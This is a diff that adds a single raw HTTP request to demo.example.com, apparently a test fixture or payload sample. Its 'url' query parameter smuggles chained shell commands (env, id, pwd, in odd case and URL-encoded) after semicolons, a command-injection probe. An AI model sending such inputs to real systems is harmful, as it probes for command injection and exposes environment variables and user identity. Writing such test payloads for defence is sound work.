@@ -1,0 +1,4 @@
+GET /a?url=;%20eNv;%20Id;%20PwD HTTP/1.1
+Host: demo.example.com
+Connection: close
+
